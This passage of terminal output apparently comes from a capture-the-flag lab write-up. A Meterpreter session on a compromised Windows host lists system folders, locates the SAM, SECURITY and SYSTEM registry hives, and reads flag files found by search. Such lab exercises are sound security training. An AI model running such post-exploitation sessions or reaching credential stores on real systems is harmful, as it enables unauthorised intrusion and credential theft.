100666/rw-rw-rw-  6653     fil   2019-03-18 04:06:17 +0530  WindowsUpdate.log
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:39 +0530  addins
040555/r-xr-xr-x  4096     dir   2019-03-18 04:01:23 +0530  assembly
100777/rwxrwxrwx  71168    fil   2010-11-21 08:54:22 +0530  bfsvc.exe
100666/rw-rw-rw-  67584    fil   2022-06-05 12:05:07 +0530  bootstat.dat
040777/rwxrwxrwx  0        dir   2018-12-13 04:34:07 +0530  debug
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  diagnostics
040777/rwxrwxrwx  24576    dir   2011-04-12 13:58:34 +0530  ehome
040777/rwxrwxrwx  4096     dir   2011-04-12 13:47:52 +0530  en-US
100777/rwxrwxrwx  2872320  fil   2010-11-21 08:54:11 +0530  explorer.exe
100777/rwxrwxrwx  15360    fil   2009-07-14 07:09:10 +0530  fveupdate.exe
100777/rwxrwxrwx  16896    fil   2009-07-14 07:09:12 +0530  hh.exe
040777/rwxrwxrwx  327680   dir   2022-06-05 12:09:33 +0530  inf
100666/rw-rw-rw-  43131    fil   2009-07-14 04:36:54 +0530  mib.bin
100666/rw-rw-rw-  1405     fil   2009-06-11 02:06:48 +0530  msdfmap.ini
100777/rwxrwxrwx  193536   fil   2009-07-14 07:09:25 +0530  notepad.exe
100777/rwxrwxrwx  427008   fil   2009-07-14 07:09:29 +0530  regedit.exe
040777/rwxrwxrwx  0        dir   2018-12-13 04:34:10 +0530  rescache
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  schemas
040777/rwxrwxrwx  4096     dir   2011-04-12 13:58:27 +0530  security
040777/rwxrwxrwx  4096     dir   2011-04-12 13:47:53 +0530  servicing
100666/rw-rw-rw-  22000    fil   2022-06-05 12:05:23 +0530  setupact.log
100666/rw-rw-rw-  0        fil   2009-07-14 10:21:00 +0530  setuperr.log
100777/rwxrwxrwx  67072    fil   2010-11-21 08:54:16 +0530  splwow64.exe
040777/rwxrwxrwx  0        dir   2009-07-14 08:06:55 +0530  system
100666/rw-rw-rw-  219      fil   2009-06-11 02:38:04 +0530  system.ini
040777/rwxrwxrwx  0        dir   2009-07-14 08:04:33 +0530  tracing
100666/rw-rw-rw-  94784    fil   2009-06-11 03:11:17 +0530  twain.dll
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:39 +0530  twain_32
100666/rw-rw-rw-  51200    fil   2010-11-21 08:55:10 +0530  twain_32.dll
100777/rwxrwxrwx  49680    fil   2009-06-11 03:11:17 +0530  twunk_16.exe
100777/rwxrwxrwx  31232    fil   2009-07-14 06:44:42 +0530  twunk_32.exe
100666/rw-rw-rw-  403      fil   2009-07-14 10:39:22 +0530  win.ini
100777/rwxrwxrwx  9728     fil   2009-07-14 06:44:45 +0530  winhlp32.exe
040777/rwxrwxrwx  7864320  dir   2018-12-13 08:50:56 +0530  winsxs
100777/rwxrwxrwx  10240    fil   2009-07-14 07:09:57 +0530  write.exe

meterpreter > cd System32
meterpreter > cd Config
meterpreter > dir
Listing: C:\Windows\System32\Config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-13 04:30:40 +0530  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-13 04:30:40 +0530  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2022-06-05 12:15:44 +0530  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:10 +0530  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2022-06-05 12:15:44 +0530  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2022-06-05 12:05:58 +0530  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2022-06-05 12:05:58 +0530  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2022-06-05 12:05:58 +0530  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536     fil   2022-06-05 12:05:58 +0530  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2018-12-13 08:50:57 +0530  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2018-12-13 08:50:57 +0530  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 10:31:27 +0530  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2022-06-05 12:15:54 +0530  DEFAULT
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:10 +0530  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2022-06-05 12:15:54 +0530  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 03:52:17 +0530  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0         dir   2009-07-14 08:04:57 +0530  Journal
040777/rwxrwxrwx  4096      dir   2019-03-18 01:26:54 +0530  RegBack
100666/rw-rw-rw-  262144    fil   2019-03-18 01:35:08 +0530  SAM
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:10 +0530  SAM.LOG
100666/rw-rw-rw-  21504     fil   2019-03-18 04:09:12 +0530  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 03:52:17 +0530  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2022-06-05 12:15:29 +0530  SECURITY
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:10 +0530  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2022-06-05 12:15:29 +0530  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 03:52:17 +0530  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 03:52:17 +0530  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2022-06-05 12:26:40 +0530  SOFTWARE
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:10 +0530  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2022-06-05 12:26:40 +0530  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 03:51:19 +0530  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 03:51:19 +0530  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 03:51:19 +0530  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2022-06-05 12:28:57 +0530  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 14:02:06 +0530  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2022-06-05 12:28:57 +0530  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 08:04:08 +0530  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 03:51:22 +0530  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 03:51:22 +0530  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 03:51:22 +0530  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-13 04:33:05 +0530  TxR
100666/rw-rw-rw-  34        fil   2019-03-18 01:02:48 +0530  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 08:11:37 +0530  systemprofile

meterpreter > cat flag2.txt
flag{sam_database_elevated_access}meterpreter > pwd
C:\Windows\System32\Config
meterpreter > search flag3.txt
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > search -f flag3.txt
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 00:56:36 +0530

meterpreter > cd c:\Users\Jon\Documents
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > pwd
C:\Windows\System32\Config
meterpreter > cd ../../..
cdmeterpreter > cd Users
meterpreter > cd Jon
meterpreter > cd Documents
meterpreter > dir
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 08:43:31 +0530  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 08:43:31 +0530  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 08:43:31 +0530  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 08:43:48 +0530  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-18 00:56:36 +0530  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}meterpreter >
```
